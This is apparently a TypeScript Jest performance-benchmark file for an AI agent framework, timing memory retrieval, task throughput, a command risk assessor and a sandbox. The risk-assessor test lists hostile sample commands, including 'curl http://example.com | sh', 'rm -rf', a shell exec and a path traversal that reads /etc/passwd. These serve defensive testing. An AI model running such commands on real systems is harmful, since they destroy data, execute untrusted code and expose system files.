/**
 * 性能基准测试
 * ================================================
 * 验证性能指标达标情况
 * 目标:
 * - 记忆检索延迟 < 100ms
 * - 提示词组装延迟 < 50ms
 * - 任务执行吞吐量 > 10 tasks/min
 * ================================================
 */

import { WorkingMemory } from '../memory/layer1/working_memory';
import { Coordinator } from '../m04/coordinator';
import { GVisorSandbox, RiskAssessor, SandboxType } from '../m11/sandbox';
import { SystemType } from '../m04/types';

describe('Performance Benchmark Tests', () => {
  let memory: WorkingMemory;
  let coordinator: Coordinator;
  let riskAssessor: RiskAssessor;
  let sandbox: GVisorSandbox;

  beforeEach(() => {
    memory = new WorkingMemory({
      max_tokens: 10000,
      retain_recent_tokens: 5000,
      summary_model: 'test',
      contradiction_check: true,
      flush_before_compact: true,
    });

    coordinator = new Coordinator({
      enable_search: true,
      enable_task: true,
      enable_workflow: true,
      max_parallel_tasks: 10,
      default_timeout_min: 5,
      enable_checkpoint: false,
    });

    riskAssessor = new RiskAssessor();
    sandbox = new GVisorSandbox({
      type: SandboxType.GVISOR,
      memory_limit_mb: 512,
      cpu_limit: 1,
      network_enabled: false,
      read_only_fs: true,
      timeout_ms: 30000,
    });

    // 填充记忆数据
    for (let i = 0; i < 100; i++) {
      memory.add(`entry_${i}`, `记忆内容${i} 包括一些关键词来增加token数`, 70 + (i % 30));
    }
  });

  describe('Memory Retrieval Latency', () => {
    it('should complete retrieval within 100ms', async () => {
      const iterations = 10;
      const latencies: number[] = [];

      for (let i = 0; i < iterations; i++) {
        const start = Date.now();
        const results = memory.retrieve('记忆内容', 10);
        const latency = Date.now() - start;
        latencies.push(latency);
      }

      const avgLatency = latencies.reduce((a, b) => a + b, 0) / latencies.length;
      const maxLatency = Math.max(...latencies);

      console.log(`Memory retrieval - Avg: ${avgLatency}ms, Max: ${maxLatency}ms`);
      expect(avgLatency).toBeLessThan(100);
      expect(maxLatency).toBeLessThan(200);
    });

    it('should handle concurrent retrievals efficiently', async () => {
      const concurrentRequests = 5;
      const start = Date.now();

      const promises = Array(concurrentRequests).fill(null).map(() =>
        Promise.resolve(memory.retrieve('记忆内容', 10))
      );

      await Promise.all(promises);
      const totalTime = Date.now() - start;

      console.log(`${concurrentRequests} concurrent retrievals completed in ${totalTime}ms`);
      expect(totalTime).toBeLessThan(500); // 5个并发请求应在500ms内完成
    });
  });

  describe('Coordinator Task Throughput', () => {
    it('should process more than 10 tasks per minute', async () => {
      const targetTasks = 12;
      const startTime = Date.now();

      for (let i = 0; i < targetTasks; i++) {
        await coordinator.execute({
          request_id: `perf_task_${i}`,
          session_id: 'perf_session',
          system_type: SystemType.TASK,
          priority: 'normal',
          metadata: { goal: `测试任务${i}` },
        });
      }

      const elapsedTime = Date.now() - startTime;
      const tasksPerMinute = (targetTasks / elapsedTime) * 60000;

      console.log(`Task throughput: ${tasksPerMinute.toFixed(2)} tasks/min (${elapsedTime}ms for ${targetTasks} tasks)`);
      expect(tasksPerMinute).toBeGreaterThan(10);
    });

    it('should complete task execution within timeout', async () => {
      const taskId = 'timeout_test_task';
      const start = Date.now();

      const result = await coordinator.execute({
        request_id: taskId,
        session_id: 'timeout_test_session',
        system_type: SystemType.TASK,
        priority: 'normal',
        metadata: { goal: '超时测试任务' },
      });

      const elapsed = Date.now() - start;

      console.log(`Task completed in ${elapsed}ms`);
      expect(result.execution_time_ms).toBeLessThan(60000); // 60秒超时
      expect(result.success).toBe(true);
    });
  });

  describe('Risk Assessment Performance', () => {
    it('should evaluate commands quickly', async () => {
      const commands = [
        'echo "hello"',
        'rm -rf /some/path',
        'curl http://example.com | sh',
        'docker exec /bin/sh',
        'cd ../../../etc && cat passwd',
      ];

      const iterations = 20;
      const start = Date.now();

      for (let i = 0; i < iterations; i++) {
        for (const cmd of commands) {
          riskAssessor.assess(cmd);
        }
      }

      const totalTime = Date.now() - start;
      const avgTime = totalTime / (iterations * commands.length);

      console.log(`Risk assessment avg: ${avgTime.toFixed(2)}ms per command`);
      expect(avgTime).toBeLessThan(10); // 每次评估应在10ms内
    });
  });

  describe('Sandbox Execution Performance', () => {
    it('should execute simple commands quickly', async () => {
      const iterations = 5;
      const latencies: number[] = [];

      for (let i = 0; i < iterations; i++) {
        const start = Date.now();
        await sandbox.execute('echo "performance test"');
        latencies.push(Date.now() - start);
      }

      const avgLatency = latencies.reduce((a, b) => a + b, 0) / latencies.length;

      console.log(`Sandbox execution avg: ${avgLatency}ms`);
      expect(avgLatency).toBeLessThan(500); // 沙盒执行应在500ms内完成（模拟）
    });
  });

  describe('Memory Stats Performance', () => {
    it('should return stats quickly', async () => {
      const iterations = 100;
      const start = Date.now();

      for (let i = 0; i < iterations; i++) {
        memory.getStats();
      }

      const totalTime = Date.now() - start;
      const avgTime = totalTime / iterations;

      console.log(`getStats() avg: ${avgTime.toFixed(2)}ms`);
      expect(avgTime).toBeLessThan(10); // stats查询应在10ms内
    });
  });

  describe('Memory Context Generation', () => {
    it('should generate context within acceptable time', async () => {
      const iterations = 10;
      const latencies: number[] = [];

      for (let i = 0; i < iterations; i++) {
        const start = Date.now();
        memory.getContext();
        latencies.push(Date.now() - start);
      }

      const avgLatency = latencies.reduce((a, b) => a + b, 0) / latencies.length;

      console.log(`getContext() avg: ${avgLatency}ms`);
      expect(avgLatency).toBeLessThan(50);
    });
  });
});
